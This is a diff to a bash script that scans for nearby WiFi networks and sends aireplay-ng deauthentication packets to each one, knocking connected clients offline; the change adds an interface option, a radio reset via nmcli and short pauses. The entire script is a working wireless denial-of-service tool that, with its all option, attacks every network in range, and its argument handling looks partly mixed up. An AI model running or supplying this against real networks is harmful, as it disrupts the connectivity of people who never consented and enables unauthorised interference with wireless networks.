@@ -8,18 +8,23 @@ function usage {
     echo "        Number of deauth packets"
     echo "    -h --help"
     echo "        Prints this"
+    echo "    -i --interface"
+    echo "        Specify interface"
     exit
 }
 essids="\(^$\)"
 COUNT=3
+interface="wlan0"
 while (( "$#" )); do
     arg=$1
     if [ "x`echo $arg | grep '^-'`" != "x" ]; then
 	case $arg in
 	  "-a" ) essids="\(\)" ;;
-	  "--all" ) essids="\(\)" ;;
+	  "-all" ) essids="\(\)" ;;
 	  "-c" ) shift;COUNT=$1 ;;
 	  "--count" ) shift;COUNT=$1 ;;
+	  "-i" ) shift;interface=$1 ;;
+	  "--interface" ) shift;interface=$1 ;;
 	  "-h" ) usage ;;
 	  "--help" ) usage ;;
 	  * ) echo "unrecognized option $arg"; usage
@@ -30,10 +35,13 @@ while (( "$#" )); do
     fi
     shift
 done
-
+echo Preparing Wifi
+nmcli radio wifi off
+nmcli radio wifi on
+sleep 1
 echo Searching for Wifi Networks...
 wifis=(`\
-          iwlist wlan0 scanning | \
+          iwlist "$interface" scanning | \
           grep "\(ESSID:\)\|\(Address:\)\|\(Channel:\)" | \
           sed 's/Cell [0-9]\{1,\} -//g' | \
           sed 's/^[ ]\{1,\}//g' | \
@@ -42,19 +50,20 @@ wifis=(`\
       `)
 
 echo Putting interface down...
-ifconfig wlan0 down
+ifconfig "$interface" down
 
 for (( i=2; i <= ${#wifis[*]}; i+=3 )); do
     ESSID=${wifis[$i-2]}
     CHANNEL=${wifis[$i-1]}
     ADDRESS=${wifis[$i]}
     if [ "x`echo $ADDRESS | grep "$essids"`" != "x" ]; then
-        echo Setting channel
-        iwconfig wlan0 channel $CHANNEL
-        echo Deauthenticating clients from $ESSID
-        aireplay-ng -0 $COUNT -a $ESSID wlan0
+        echo Setting channel $CHANNEL
+        iwconfig "$interface" channel $CHANNEL
+	sleep 1
+        echo Deauthenticating clients from $ADDRESS
+        aireplay-ng -0 $COUNT -a $ESSID "$interface"
     fi
 done
 
 echo Cleaning...
-ifconfig wlan0 up
+ifconfig "$interface" up
